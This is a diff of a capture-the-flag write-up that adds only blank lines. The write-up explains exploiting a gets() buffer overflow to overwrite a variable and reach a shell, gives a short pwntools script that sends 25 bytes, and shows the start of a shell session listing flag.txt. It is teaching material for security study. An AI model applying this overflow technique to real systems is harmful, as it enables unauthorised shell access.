@@ -29,6 +29,7 @@ int main(void)
 It looks like a standard buffer overflow question where the vulnerability here is gets(), which does not specify the amount of bytes it should accept. Since the variable we're writing to, `char name[16]` has a allocated buffer size of 16, we just need to overflow past that to start overwriting the variables we want, which in this case is `code`.
 <br>
 This is our target line:
+
 ```
 if(code != 0) {
     system("/bin/sh");
@@ -37,6 +38,7 @@ if(code != 0) {
 As long as we are able to overwrite `code`, it doesn't matter what we overwrite it with, it will redirect us to shell.
 Since stack space is generally allocated in multiples of 16, and this function declares `16+8=24 < 32` bytes for the variables, we can assume 32 bytes would be allocated to the function. Hence we just need to overwrite into the last 8 bytes of the stack and we should overwrite `code`. The length of our exploit would be 32-8+1 = 25.<br>
 Here is the final exploit:
+
 ```
 #!/usr/bin/env python
 
@@ -50,6 +52,7 @@ p.sendline("A"*25)
 p.interactive()
 ```
 This should redirect us to shell, and we with a simple `ls` we can see an entry `flag.txt`, so we simply do `cat flag.txt` to obtain the flag:
+
 ```
 $ ls
 Makefile
